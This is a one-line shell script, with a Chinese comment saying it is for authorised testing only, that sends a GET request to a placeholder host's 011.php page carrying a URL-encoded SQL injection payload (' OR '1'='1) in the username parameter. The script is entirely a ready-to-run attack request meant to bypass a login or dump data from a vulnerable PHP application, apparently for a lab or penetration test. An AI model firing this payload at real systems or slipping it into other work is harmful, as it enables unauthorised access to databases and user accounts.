#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X GET 'http://TARGET:8080/011.php?username=%27%20OR%20%271%27%3D%271'
